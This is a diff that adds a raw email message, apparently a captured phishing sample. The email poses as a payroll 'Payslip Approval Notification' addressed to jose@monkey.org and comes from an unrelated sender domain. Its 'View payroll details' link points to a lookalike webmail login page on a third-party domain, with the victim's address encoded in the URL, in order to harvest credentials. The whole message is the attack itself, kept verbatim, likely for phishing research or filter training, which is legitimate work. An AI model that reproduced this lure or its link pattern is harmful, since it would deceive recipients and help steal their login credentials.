@@ -1,0 +1,174 @@
+Return-Path: eaedu@vasflex.com
+Delivered-To: jose@monkey.org
+X-FDA: 83764483530.18.BA0FDD0
+Received: from smtp4.hiworks.co.kr (smtp4.hiworks.co.kr [121.254.168.203])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP id C2FEB60008
+	for <jose@monkey.org>; Mon, 11 Aug 2025 12:59:43 +0000 (UTC)
+Authentication-Results: imf14.b.hostedemail.com;
+	spf=pass (imf14.b.hostedemail.com: domain of eaedu@vasflex.com designates
+ 121.254.168.203 as permitted sender) smtp.mailfrom=eaedu@vasflex.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1754917184;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=v4t8yEesWkWIGgTE6OhXaNR+r4ZmAicPsNzws47WRd4=;
+	b=nihFtZv+WsERbiVr3pPQBw0CA3y9UBHK0o7hsv9wlTl258ZzaobEzvAtyErwhLykAZR9Nn
+	8b5QbbWug/sEAHhr8HLjBtBY+la8SDXqy44209z/7otQRzk9cw4XH9Dsi/Nlo+vB5fJHnm
+	v+XqLZsOtFZcOVVQ96lCB6mhTb5wNRE=
+ARC-Authentication-Results: i=1;
+	imf14.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf14.b.hostedemail.com: domain of eaedu@vasflex.com designates
+ 121.254.168.203 as permitted sender) smtp.mailfrom=eaedu@vasflex.com;
+	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1754917184; a=rsa-sha256;
+	cv=none;
+	b=4EiRzVmoKySb2k5nYTw8B2/AkK97iN0/1FMGbyMoEmyRFBJPJj1vzGc3/3QMHeeO/5Pbaa
+	DuBCF4UaEUJtumCtKb5yzG2H9TMnv3hWw0v0z0nxolBwWYnVKIHQWbzpout9GgvX6voz7M
+	Bnt0CH26Fs2IscSJnYzCzhu14uOz3nQ=
+Received: (qmail 74070 invoked from network); 11 Aug 2025 21:59:33 +0900
+Received: from unknown (HELO hiworks.co.kr) (192.168.10.224)
+	by 0 (qmail 1.03 + ejcp v14) with SMTP;
+	11 Aug 2025 21:59:33 +0900
+Received: (qmail 79373 invoked from network); 11 Aug 2025 21:59:33 +0900
+Received: from unknown (HELO 232.168.64.34.bc.googleusercontent.com)
+ (vasflex@vasflex.com@34.64.168.232)
+	by 0 (qmail 1.03 + ejcp v14) with SMTP;
+	11 Aug 2025 21:59:33 +0900
+X-Authinfo: HIWORKS SMTP authenticated
+ <vasflex@vasflex.com|34.64.168.232|eaedu@vasflex.com|250811215933_885678634>
+X-MailFrom-INFO: Info <country_code:KR|rbl_level:0>
+From: Payroll <eaedu@vasflex.com>
+To: jose@monkey.org
+Subject: monkey.org payroll for 786263  
+Date: 11 Aug 2025 05:59:33 -0700
+Message-ID: <20250811055933.6CB006F7EFE81FA7@vasflex.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Spam-Status: No, score=4.50
+X-Stat-Signature: 1ba3646gpsxmarfpxcc9ku4fdu3f9ba4
+X-Rspamd-Queue-Id: C2FEB60008
+X-Rspam-User: 
+X-HE-Tag: 1754917183-405875
+X-HE-Meta: 
+ U2FsdGVkX18Ea9RD/0NotmoP/3l/N+xJ/pXCGACLP7bB++j0brmKxUFzbQZybqlwelEA5CRIxNASUuL4bHFa+66aMYs+06LKeTLZHkE7cg115vllgtLVLx69w43fDlt1rMUXgIfhdj+/IYwZxl3YkXqMWXK7ox/VKmDdN/dKQO9TnTkLxlF+cfkh1SlJWDzJbikEsr15WYbATJcFXj6m71rupMyl70KcZB/EqwChOl1UTYQ2WPRq34/73f25YRINc1d/Z3USyVv1LJQFAKSjpfQ95Khps/M8Z05yvQmGFd7bXEPXTlHG9RJGfre7f53oVLyAxXE1Za/goVSpSEd25n1z8j/9cZXyMSjplfW6B1j/pnOs3Q2vPNVb+oat/mWoYNYOfkAXYtMcxF+bt5OepSq5AAMwpKto3rPTmS9ZOiXBA/tsibdKozCZKT56swSO+bLFTlyHoM3W9cj3wZ1ec557AYTGFe+Z+2sjhwdUUcSknOuIS4Gs0A3f0WAA9LZE7FCxKQEXFNHXljrd+bkQm0TD3/df1d0oh9YeowJI1kHLoULdfNR58A/yjm7qezsE2/eGG5ZqdgHr1dAU9Z/W5QGtg+PANasuSPtp5dGd86K/eEgJAESlsTZhIx/8MyIfXG1grvI5xH0FAQGtWvT1EFbReEM3oV53RQXidxKzgqQ6YDehtU7GDZCSkcPmgtvoqTUnjp9bqRyPe7qIBTtgZncthOayFmJXG5fMfsAMROZLoUt/jgINGdnBQO+bvUDGa7DU+SHg2jYmSsKpFPQgCBUwXoEcLlYjIRv9hPe46qhaMhfROmIPGjFX3E4z5IRssa8ZMDda4irJa0TUdK9eRhQEfU4da4xHmWNybuvZLgrvZNPLfUE/FAhvmNccWF3w1cZgjwoXCkGZs886CqVX/n/hhPZl25vxFcpal/pGxisixByLdpFqJ9P+MZWR06yLoJ5L5mEx99WiL+IYt0ITO87Gith
+ HtmP0t2btLhsxCqazRnYIuN67aqbuzITHujF7TmAZlpVTZxjfb3xeomHUg9RX5Z3oF7V/jf68ETW6rZh+ZCYWv7cjL5/hWfSX5nNXcMdyaITTgD4ToW3UCCPV1Dy97LbpxzP/UUu+B6nKIsi9+9D7oGwKQFj090w6yRX1wNcFUJN4AmqGmQ8+nsYSIQ==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 325
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table width=3D"100%" style=3D"color: rgb(32, 31, 30); text-transform: none=
+; letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 15px;=
+ font-style: normal; font-weight: 400; word-spacing: 0px; white-space: norm=
+al; border-collapse: collapse; orphans: 2; widows: 2; font-stretch: inherit=
+; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; fon=
+t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
+ckness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial; font-variant-numeric: inherit; font-variant=
+-east-asian: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tb=
+ody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"=
+>
+<td align=3D"center" style=3D'margin: 0px; padding: 60px 50px 0px; text-ali=
+gn: center; color: rgb(80, 80, 80); line-height: 48px; letter-spacing: -0.0=
+3em; font-family: "Segoe UI Semibold", SUWSB, "Segoe UI", Verdana, sans-ser=
+if; border-collapse: collapse; box-sizing: border-box;' bgcolor=3D"#0000a0"=
+><h2 style=3D"margin: 0px; padding: 0px; line-height: 48px; letter-spacing:=
+ -0.03em; font-weight: normal; box-sizing: border-box;"><font color=3D"#f97=
+c00" face=3D"Arial" style=3D"box-sizing: border-box;">
+<span style=3D"font-weight: bolder; box-sizing: border-box;"><em style=3D"b=
+ox-sizing: border-box;"><font size=3D"6">Payslip Approval Notification</fon=
+t></em></span></font></h2></td></tr><tr style=3D"box-sizing: border-box;"><=
+td style=3D'margin: 0px; padding: 25px 50px 0px; text-align: center; line-h=
+eight: 20px; letter-spacing: -0.01em; font-family: "Segoe UI", SUWR, Verdan=
+a, sans-serif; font-size: 13px; border-collapse: collapse; box-sizing: bord=
+er-box;' bgcolor=3D"#f4f4f4">
+<p style=3D'margin: 0px; padding: 0px; text-align: left; line-height: 20px;=
+ letter-spacing: -0.01em; font-family: "Segoe UI", SUWR, Verdana, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'><font color=3D"#4a4a4a"><b>De=
+ar jose,</b></font></p><p style=3D'margin: 0px; padding: 0px; text-align: l=
+eft; line-height: 20px; letter-spacing: -0.01em; font-family: "Segoe UI", S=
+UWR, Verdana, sans-serif, serif, EmojiFont; box-sizing: border-box;'><font =
+color=3D"#4a4a4a"><b><br></b></font></p>
+<p style=3D'margin: 0px; padding: 0px; text-align: left; line-height: 20px;=
+ letter-spacing: -0.01em; font-family: "Segoe UI", SUWR, Verdana, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'><font color=3D"#4a4a4a"><b>We=
+ are pleased to inform you that your payroll has been approved for the&nbsp=
+; current period. Please find the details&nbsp;below:</b></font></p>
+<p style=3D'margin: 0px; padding: 0px; text-align: left; line-height: 20px;=
+ letter-spacing: -0.01em; font-family: "Segoe UI", SUWR, Verdana, sans-seri=
+f, serif, EmojiFont; box-sizing: border-box;'><font color=3D"#4a4a4a"><b><b=
+r></b></font></p><p style=3D'margin: 0px; padding: 0px; text-align: left; l=
+ine-height: 20px; letter-spacing: -0.01em; font-family: "Segoe UI", SUWR, V=
+erdana, sans-serif, serif, EmojiFont; box-sizing: border-box;'><font color=
+=3D"#4a4a4a"><b>
+Kindly review the details and let us know if you have any questions or&nbsp=
+;concerns.</b></font></p></td></tr><tr style=3D"box-sizing: border-box;"><t=
+d style=3D"margin: 0px; padding: 35px 50px 0px; text-align: left; border-co=
+llapse: collapse; box-sizing: border-box;" bgcolor=3D"#f4f4f4"><font color=
+=3D"#1d66b8" size=3D"4" style=3D"box-sizing: border-box;"><u style=3D"box-s=
+izing: border-box;"><span style=3D"font-weight: bolder; box-sizing: border-=
+box;">
+<a style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(0, 115=
+, 236); vertical-align: baseline; box-sizing: border-box; background-color:=
+ transparent; text-decoration-line: none;" href=3D"https://webmail-oautho.b=
+odinecc.com/prompt/2098/cpsess6634582193/roundcube/user-miscwp/wfxmuulrbpet=
+bdjvbkza#am9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"noreferrer">View pa=
+yroll details</a></span></u></font></td></tr><tr style=3D"box-sizing: borde=
+r-box;">
+<td style=3D"margin: 0px; padding: 35px 50px 0px; text-align: center; borde=
+r-collapse: collapse; box-sizing: border-box;" bgcolor=3D"#f4f4f4"><table s=
+tyle=3D"margin: 0px auto; text-align: left; border-collapse: collapse;" bor=
+der=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: b=
+order-box;"><tr style=3D"box-sizing: border-box;">
+<td style=3D'margin: 0px; padding: 0px; text-align: left; line-height: 21px=
+; letter-spacing: -0.01em; font-family: "Segoe UI Semibold", SUWSB, "Segoe =
+UI", Verdana, sans-serif; font-size: 16px; border-collapse: collapse; box-s=
+izing: border-box;' bgcolor=3D"#f4f4f4"><br style=3D"box-sizing: border-box=
+;"></td><td style=3D"margin: 0px; padding: 0px 10px; text-align: left; bord=
+er-collapse: collapse; box-sizing: border-box;" bgcolor=3D"#f4f4f4"><br sty=
+le=3D"box-sizing: border-box;"></td></tr></tbody></table></td>
+</tr></tbody></table>
+<h2 style=3D"margin: 0px; padding: 0px; color: rgb(44, 54, 58); text-transf=
+orm: none; line-height: 48px; text-indent: 0px; letter-spacing: -0.03em; fo=
+nt-family: Roboto, sans-serif; font-style: normal; font-weight: normal; wor=
+d-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;"><font color=3D"#f97c00" face=3D"A=
+rial" size=3D"2" style=3D"box-sizing: border-box;"><em style=3D"box-sizing:=
+ border-box;"><span style=3D"font-weight: bolder; box-sizing: border-box;">=
+Payroll</span></em></font></h2>
+<h3 style=3D"margin: 0px; padding: 0px; color: rgb(32, 31, 30); text-transf=
+orm: none; line-height: 25px; text-indent: 0px; letter-spacing: normal; fon=
+t-family: Roboto, sans-serif; font-size: 1.25em; font-style: normal; word-s=
+pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
+s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
+ font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;"><div style=3D"border-width: 0px; =
+margin: 0px; padding: 0px; color: rgb(51, 51, 51); overflow: hidden; vertic=
+al-align: baseline; box-sizing: border-box;"><font color=3D"#e06666" face=
+=3D"georgia, serif" size=3D"6" style=3D"box-sizing: border-box;"><p style=
+=3D'margin: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: "Hel=
+vetica Neue", Helvetica, Arial, sans-serif; font-size: 12px; box-sizing: bo=
+rder-box;'>
+Copyright &copy; 2025<span style=3D"box-sizing: border-box;">&nbsp;</span>&=
+nbsp;Diproinduca All&nbsp;rights reserved.</p></font></div></h3><p>
+</p>
+
+
+</body></html>
+
